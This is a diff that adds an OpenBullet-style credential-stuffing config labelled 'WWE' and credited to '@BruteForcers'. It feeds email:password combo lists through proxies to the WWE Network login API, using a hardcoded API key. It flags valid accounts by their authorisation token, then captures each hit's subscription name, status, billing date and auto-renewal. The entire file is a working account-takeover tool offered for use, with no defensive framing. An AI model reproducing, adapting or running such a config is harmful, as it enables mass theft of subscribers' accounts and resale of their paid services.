@@ -1,0 +1,106 @@
+[SETTINGS]
+{
+  "Name": "WWE",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-09-13T23:49:10.7414111+04:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@BruteForcers",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Post REQUEST POST "https://dce-frontoffice.imggaming.com/api/v2/login" 
+  CONTENT "{\"id\":\"<USER>\",\"secret\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "pragma: no-cache" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "origin: https://watch.wwe.com" 
+  HEADER "realm: dce.wwe" 
+  HEADER "referer: https://watch.wwe.com/signin" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "x-api-key: cca51ea0-7837-40df-a055-75eb6347b2e7" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"status\":404" 
+    KEY "Unable to process JSON" 
+    KEY "JSON is syntactically invalid" 
+    KEY "failedAuthentication" 
+  KEYCHAIN Success OR 
+    KEY "\"authorisationToken\":" 
+  KEYCHAIN Ban OR 
+    KEY "403 Forbidden" 
+
+#Token PARSE "<SOURCE>" JSON "authorisationToken" -> VAR "Token" 
+
+REQUEST GET "https://dce-frontoffice.imggaming.com/api/v2/user/licence?include_active=true" 
+  
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "pragma: no-cache" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "authorization: Bearer <Token>" 
+  HEADER "origin: https://watch.wwe.com" 
+  HEADER "realm: dce.wwe" 
+  HEADER "referer: https://watch.wwe.com/account" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "x-api-key: cca51ea0-7837-40df-a055-75eb6347b2e7" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" EqualTo "[]" 
+  KEYCHAIN Ban OR 
+    KEY "403 Forbidden" 
+  KEYCHAIN Success OR 
+    KEY "\"licences\"" 
+
+PARSE "<SOURCE>" JSON "[0].licences[*]" JTokenParsing=TRUE Recursive=TRUE -> VAR "LICENSES" 
+
+UTILITY List "LICENSES" Length -> VAR "TOTAL_LICENSES" 
+
+FUNCTION Compute "<TOTAL_LICENSES>-1" -> VAR "LATEST_LIC_INDEX" 
+
+PARSE "<LICENSES>" JSON "[<LATEST_LIC_INDEX>].status" JTokenParsing=TRUE -> CAP "Status" 
+
+PARSE "<LICENSES>" JSON "[<LATEST_LIC_INDEX>].licence.name" JTokenParsing=TRUE -> CAP "Subscription" 
+
+PARSE "<LICENSES>" JSON "[<LATEST_LIC_INDEX>].licenceStatus.expiryTimestamp" JTokenParsing=TRUE -> VAR "EXPIRY" 
+
+FUNCTION UnixTimeToDate "yyyy-MM-dd:HH-mm-ss" "<EXPIRY>" -> CAP "Next Billing Date" 
+
+PARSE "<LICENSES>" JSON "[<LATEST_LIC_INDEX>].licenceStatus.autoRenewingStatus" JTokenParsing=TRUE -> CAP "Auto Renewal" 
+
